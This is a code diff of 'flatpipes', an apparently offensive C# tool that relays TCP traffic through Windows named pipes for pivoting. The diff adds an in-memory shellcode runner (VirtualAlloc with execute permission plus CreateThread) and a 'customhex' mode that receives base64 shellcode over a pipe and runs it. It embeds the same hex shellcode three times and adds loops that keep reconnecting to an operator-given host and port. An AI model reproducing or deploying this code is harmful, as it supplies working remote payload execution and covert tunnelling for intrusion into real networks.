@@ -57,6 +57,7 @@ namespace flatpipesns
     {
         static void Main(string[] args)
         {
+            // HANLDE PARAMS
             if (args.Length<6)
             {
                 Console.WriteLine("\nUsage: flatpipes [pipemode] [socketmode] [pipename] [pipeaddr] [ip] [port] [extension]\n");
@@ -65,7 +66,7 @@ namespace flatpipesns
                 Console.WriteLine("  pipeaddr\tIP for pipe connection (for local or server use '.')");
                 Console.WriteLine("  pipename\tPrefix of the two pipes created");
                 Console.WriteLine("  ip/port\tSocket info to listen on or connect to");
-                Console.WriteLine("  extension\tMisc tools (revmeter|bindmeter)");
+                Console.WriteLine("  extension\tMisc tools (revmeter|bindmeter|customhex)");
                 Environment.Exit(1);
             }
             String pmode = args[0];
@@ -75,37 +76,29 @@ namespace flatpipesns
             String ip = args[4];
             String port = args[5];
             String extension = null;
-            if (args.Length == 7) {
-                extension = args[6];
-            }
+            if (args.Length == 7) extension = args[6];
 
-            if (IntPtr.Size == 4)
-            {
-                Console.WriteLine("[!] Running as 32-bit");
-            }
-            else if (IntPtr.Size == 8)
-            {
-                Console.WriteLine("[!] Running as 64-bit");
-            }
-            else
-            {
-                Console.WriteLine("[!] Running in the future");
-            }
+            // PRINT ARCHITECTURE
+            if (IntPtr.Size == 4) Console.WriteLine("[!] Running as 32-bit");
+            else if (IntPtr.Size == 8) Console.WriteLine("[!] Running as 64-bit");
+            else Console.WriteLine("[!] Running in the future");
 
+            // PIPE SERVER IMPLEMENTATION
             if (String.Compare(pmode, "pserver") ==0)
             {
-                // Handle pipes
+                // Handle pipes (block until connected)
                 Console.WriteLine("[!] Waiting for pipe connections");
                 var pipe_s2c = new NamedPipeServerStream(pipename + "_s2c", PipeDirection.Out); // Writing to client
                 var pipe_c2s = new NamedPipeServerStream(pipename + "_c2s", PipeDirection.In); // Reading from client
                 pipe_s2c.WaitForConnection();
                 Console.WriteLine("[!] Client connected on downstream pipe");
                 pipe_c2s.WaitForConnection();
-                Console.WriteLine("[!] Client Connected on upstream pipe");
+                Console.WriteLine("[!] Client connected on upstream pipe");
                 StreamString ss_s2c = new StreamString(pipe_s2c);
                 StreamString ss_c2s = new StreamString(pipe_c2s);
 
                 // Check for extensions execution
+                IntPtr shellcodeProcessHandle = IntPtr.Zero;
                 if (extension != null)
                 {
                     if (String.Compare(extension, "revmeter") == 0 && String.Compare(smode, "sserver") == 0)
@@ -113,12 +106,7 @@ namespace flatpipesns
                         Console.WriteLine("[!] Extension " + extension + " starting.");
                         String ShellCode = "\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xc0\\x00\\x00\\x00\\x41\\x51\\x41\\x50\\x52\\x51\\x56\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\\x48\\x8b\\x52\\x18\\x48\\x8b\\x52\\x20\\x48\\x8b\\x72\\x50\\x48\\x0f\\xb7\\x4a\\x4a\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\x41\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\xe2\\xed\\x52\\x41\\x51\\x48\\x8b\\x52\\x20\\x8b\\x42\\x3c\\x48\\x01\\xd0\\x8b\\x80\\x88\\x00\\x00\\x00\\x48\\x85\\xc0\\x74\\x67\\x48\\x01\\xd0\\x50\\x8b\\x48\\x18\\x44\\x8b\\x40\\x20\\x49\\x01\\xd0\\xe3\\x56\\x48\\xff\\xc9\\x41\\x8b\\x34\\x88\\x48\\x01\\xd6\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x41\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\x38\\xe0\\x75\\xf1\\x4c\\x03\\x4c\\x24\\x08\\x45\\x39\\xd1\\x75\\xd8\\x58\\x44\\x8b\\x40\\x24\\x49\\x01\\xd0\\x66\\x41\\x8b\\x0c\\x48\\x44\\x8b\\x40\\x1c\\x49\\x01\\xd0\\x41\\x8b\\x04\\x88\\x48\\x01\\xd0\\x41\\x58\\x41\\x58\\x5e\\x59\\x5a\\x41\\x58\\x41\\x59\\x41\\x5a\\x48\\x83\\xec\\x20\\x41\\x52\\xff\\xe0\\x58\\x41\\x59\\x5a\\x48\\x8b\\x12\\xe9\\x57\\xff\\xff\\xff\\x5d\\x48\\xba\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x48\\x8d\\x8d\\x01\\x01\\x00\\x00\\x41\\xba\\x31\\x8b\\x6f\\x87\\xff\\xd5\\xbb\\xe0\\x1d\\x2a\\x0a\\x41\\xba\\xa6\\x95\\xbd\\x9d\\xff\\xd5\\x48\\x83\\xc4\\x28\\x3c\\x06\\x7c\\x0a\\x80\\xfb\\xe0\\x75\\x05\\xbb\\x47\\x13\\x72\\x6f\\x6a\\x00\\x59\\x41\\x89\\xda\\xff\\xd5\\x63\\x61\\x6c\\x63\\x00";
                         byte[] shellcode = StringToByteArray(ShellCode);
-                        UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-                        Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
-                        IntPtr hThread = IntPtr.Zero;
-                        UInt32 threadId = 0;
-                        IntPtr pinfo = IntPtr.Zero;
-                        hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
+                        shellcodeProcessHandle = exec_shellcode(shellcode);
                         //WaitForSingleObject(hThread, 0xFFFFFFFF);
                         //Console.WriteLine("[!] Extension " + extension + " 4");
                     }
@@ -132,12 +120,7 @@ namespace flatpipesns
                         Console.WriteLine("[!] Extension " + extension + " starting.");
                         String ShellCode = "\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xc0\\x00\\x00\\x00\\x41\\x51\\x41\\x50\\x52\\x51\\x56\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\\x48\\x8b\\x52\\x18\\x48\\x8b\\x52\\x20\\x48\\x8b\\x72\\x50\\x48\\x0f\\xb7\\x4a\\x4a\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\x41\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\xe2\\xed\\x52\\x41\\x51\\x48\\x8b\\x52\\x20\\x8b\\x42\\x3c\\x48\\x01\\xd0\\x8b\\x80\\x88\\x00\\x00\\x00\\x48\\x85\\xc0\\x74\\x67\\x48\\x01\\xd0\\x50\\x8b\\x48\\x18\\x44\\x8b\\x40\\x20\\x49\\x01\\xd0\\xe3\\x56\\x48\\xff\\xc9\\x41\\x8b\\x34\\x88\\x48\\x01\\xd6\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x41\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\x38\\xe0\\x75\\xf1\\x4c\\x03\\x4c\\x24\\x08\\x45\\x39\\xd1\\x75\\xd8\\x58\\x44\\x8b\\x40\\x24\\x49\\x01\\xd0\\x66\\x41\\x8b\\x0c\\x48\\x44\\x8b\\x40\\x1c\\x49\\x01\\xd0\\x41\\x8b\\x04\\x88\\x48\\x01\\xd0\\x41\\x58\\x41\\x58\\x5e\\x59\\x5a\\x41\\x58\\x41\\x59\\x41\\x5a\\x48\\x83\\xec\\x20\\x41\\x52\\xff\\xe0\\x58\\x41\\x59\\x5a\\x48\\x8b\\x12\\xe9\\x57\\xff\\xff\\xff\\x5d\\x48\\xba\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x48\\x8d\\x8d\\x01\\x01\\x00\\x00\\x41\\xba\\x31\\x8b\\x6f\\x87\\xff\\xd5\\xbb\\xe0\\x1d\\x2a\\x0a\\x41\\xba\\xa6\\x95\\xbd\\x9d\\xff\\xd5\\x48\\x83\\xc4\\x28\\x3c\\x06\\x7c\\x0a\\x80\\xfb\\xe0\\x75\\x05\\xbb\\x47\\x13\\x72\\x6f\\x6a\\x00\\x59\\x41\\x89\\xda\\xff\\xd5\\x63\\x61\\x6c\\x63\\x00";
                         byte[] shellcode = StringToByteArray(ShellCode);
-                        UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-                        Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
-                        IntPtr hThread = IntPtr.Zero;
-                        UInt32 threadId = 0;
-                        IntPtr pinfo = IntPtr.Zero;
-                        hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
+                        shellcodeProcessHandle = exec_shellcode(shellcode);
                         //WaitForSingleObject(hThread, 0xFFFFFFFF);
                         //Console.WriteLine("[!] Extension " + extension + " 4");
                     }
@@ -146,13 +129,36 @@ namespace flatpipesns
                         Console.WriteLine("[*] Bind payload on sserver config does not make sense. Use sclient instead.");
                         Environment.Exit(1);
                     }
+                    else if (String.Compare(extension, "customhex") == 0)
+                    {
+                        Console.WriteLine("[!] Extension " + extension + " starting. Waiting payload.");
+                        String dataEncoded;
+                        byte[] dataDecoded;
+                        dataEncoded = ss_c2s.ReadString();
+                        dataDecoded = Convert.FromBase64String(dataEncoded);
+                        shellcodeProcessHandle = exec_shellcode(dataDecoded);
+                    }
                 }
 
-                // Handle socket communication
+                // Handle socket requirements
                 NetworkStream networkStream = null;
                 if (String.Compare(smode, "sclient") == 0)
                 {
-                    TcpClient tcpClient = new TcpClient(ip, Convert.ToInt32(port));
+                    TcpClient tcpClient = null;
+                    bool ok = false;
+                    while (!ok)
+                    {
+                        try
+                        {
+                            tcpClient = new TcpClient(ip, Convert.ToInt32(port));
+                            ok = true;
+                        }
+                        catch (Exception ex)
+                        {
+                            Console.WriteLine("[*] Error while connecting. Trying again in a while..");
+                            Task.Delay(1000).Wait();
+                        }
+                    }
                     networkStream = tcpClient.GetStream();
                     Console.WriteLine("[!] Connected to " + ip + ":" + port);
                 }
@@ -170,7 +176,7 @@ namespace flatpipesns
                         }
                         catch (Exception ex)
                         {
-                            Console.WriteLine("[---] Error while listening. Check if port is used. Trying again in a while..");
+                            Console.WriteLine("[*] Error while listening. Check if port is used. Trying again in a while..");
                             Task.Delay(1000).Wait();
                         }
                     }
@@ -182,29 +188,76 @@ namespace flatpipesns
 
                 // Start the upstream/downstream handling tasks
                 Server_SocketToWritePipe(networkStream, ss_s2c);
-                Server_ReadPipeToSocket(networkStream, ss_c2s);             
+                Server_ReadPipeToSocket(networkStream, ss_c2s);
 
-                while (true) { }
+                if (shellcodeProcessHandle != IntPtr.Zero)
+                {
+                    Console.WriteLine("[!] Job done. Waiting until shellcode process exits.");
+                    WaitForSingleObject(shellcodeProcessHandle, 0xFFFFFFFF);
+                }
+                else
+                {
+                    Console.WriteLine("[!] Job done. Waiting forever.");
+                    while (true) { }
+                }
 
             }
-            else if (String.Compare(pmode, "pclient") == 0)//Client
+
+            // PIPE CLIENT IMPLEMENTATION
+            else if (String.Compare(pmode, "pclient") == 0)
             {
                 // Handle pipes
                 // Even if pserver is not online, it will block until it opens (seems to wait forever)
                 var pipe_s2c = new NamedPipeClientStream(pipeaddr, pipename + "_s2c", PipeDirection.In, PipeOptions.None); // Reading from server
                 var pipe_c2s = new NamedPipeClientStream(pipeaddr, pipename + "_c2s", PipeDirection.Out, PipeOptions.None); // Writing to server
                 pipe_s2c.Connect();
-                Console.WriteLine("[!] Connected to downstream pipe");
+                Console.WriteLine("[!] Connected to server's downstream pipe");
                 pipe_c2s.Connect();
-                Console.WriteLine("[!] Connected to upstream pipe");
+                Console.WriteLine("[!] Connected to server's upstream pipe");
                 StreamString ss_s2c = new StreamString(pipe_s2c);
                 StreamString ss_c2s = new StreamString(pipe_c2s);
 
+                // Check for extensions execution
+                if (extension != null)
+                {
+                    if (String.Compare(extension, "revmeter") == 0)
+                    {
+                        Console.WriteLine("[*] Reverse payload on pclient does not make sense. Ignoring..");
+                    }
+                    else if (String.Compare(extension, "bindmeter") == 0)
+                    {
+                        Console.WriteLine("[*] Bind payload on pclient does not make sense. Ignoring..");
+                    }
+                    else if (String.Compare(extension, "customhex") == 0)
+                    {
+                        String ShellCode_pre = "\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xc0\\x00\\x00\\x00\\x41\\x51\\x41\\x50\\x52\\x51\\x56\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\\x48\\x8b\\x52\\x18\\x48\\x8b\\x52\\x20\\x48\\x8b\\x72\\x50\\x48\\x0f\\xb7\\x4a\\x4a\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\x41\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\xe2\\xed\\x52\\x41\\x51\\x48\\x8b\\x52\\x20\\x8b\\x42\\x3c\\x48\\x01\\xd0\\x8b\\x80\\x88\\x00\\x00\\x00\\x48\\x85\\xc0\\x74\\x67\\x48\\x01\\xd0\\x50\\x8b\\x48\\x18\\x44\\x8b\\x40\\x20\\x49\\x01\\xd0\\xe3\\x56\\x48\\xff\\xc9\\x41\\x8b\\x34\\x88\\x48\\x01\\xd6\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x41\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\x38\\xe0\\x75\\xf1\\x4c\\x03\\x4c\\x24\\x08\\x45\\x39\\xd1\\x75\\xd8\\x58\\x44\\x8b\\x40\\x24\\x49\\x01\\xd0\\x66\\x41\\x8b\\x0c\\x48\\x44\\x8b\\x40\\x1c\\x49\\x01\\xd0\\x41\\x8b\\x04\\x88\\x48\\x01\\xd0\\x41\\x58\\x41\\x58\\x5e\\x59\\x5a\\x41\\x58\\x41\\x59\\x41\\x5a\\x48\\x83\\xec\\x20\\x41\\x52\\xff\\xe0\\x58\\x41\\x59\\x5a\\x48\\x8b\\x12\\xe9\\x57\\xff\\xff\\xff\\x5d\\x48\\xba\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x48\\x8d\\x8d\\x01\\x01\\x00\\x00\\x41\\xba\\x31\\x8b\\x6f\\x87\\xff\\xd5\\xbb\\xe0\\x1d\\x2a\\x0a\\x41\\xba\\xa6\\x95\\xbd\\x9d\\xff\\xd5\\x48\\x83\\xc4\\x28\\x3c\\x06\\x7c\\x0a\\x80\\xfb\\xe0\\x75\\x05\\xbb\\x47\\x13\\x72\\x6f\\x6a\\x00\\x59\\x41\\x89\\xda\\xff\\xd5\\x63\\x61\\x6c\\x63\\x00";
+                        byte[] shellcode_bytes = StringToByteArray(ShellCode_pre);
+                        String ShellCode_enc = Convert.ToBase64String(shellcode_bytes, 0, shellcode_bytes.Length);
+                        ss_c2s.WriteString(ShellCode_enc);
+                    }
+
+                }
+
                 // Handle socket communication
+                // Handle socket requirements
                 NetworkStream networkStream = null;
                 if (String.Compare(smode, "sclient") == 0)
                 {
-                    TcpClient tcpClient = new TcpClient(ip, Convert.ToInt32(port));
+                    TcpClient tcpClient = null;
+                    bool ok = false;
+                    while (!ok)
+                    {
+                        try
+                        {
+                            tcpClient = new TcpClient(ip, Convert.ToInt32(port));
+                            ok = true;
+                        }
+                        catch (Exception ex)
+                        {
+                            Console.WriteLine("[*] Error while connecting. Trying again in a while..");
+                            Task.Delay(1000).Wait();
+                        }
+                    }
                     networkStream = tcpClient.GetStream();
                     Console.WriteLine("[!] Connected to " + ip + ":" + port);
                 }
@@ -222,7 +275,7 @@ namespace flatpipesns
                         }
                         catch (Exception ex)
                         {
-                            Console.WriteLine("[---] Error while listening. Check if port is used. Trying again in a while..");
+                            Console.WriteLine("[*] Error while listening. Check if port is used. Trying again in a while..");
                             Task.Delay(1000).Wait();
                         }
                     }
@@ -237,6 +290,7 @@ namespace flatpipesns
                 Client_SocketToWritePipe(networkStream, ss_c2s);
 
                 // loop
+                Console.WriteLine("[!] Job done. Waiting forever.");
                 while (true) { }
 
             }
@@ -363,6 +417,16 @@ namespace flatpipesns
         /// <summary> 
         /// Helper: Kernel32 imports for bytecode execution
         /// </summary>
+        private static IntPtr exec_shellcode(byte[] shellcode)
+        {
+            UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+            Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
+            IntPtr hThread = IntPtr.Zero;
+            UInt32 threadId = 0;
+            IntPtr pinfo = IntPtr.Zero;
+            hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
+            return hThread;
+        }
         private static UInt32 MEM_COMMIT = 0x1000;
         private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
         [DllImport("kernel32")]
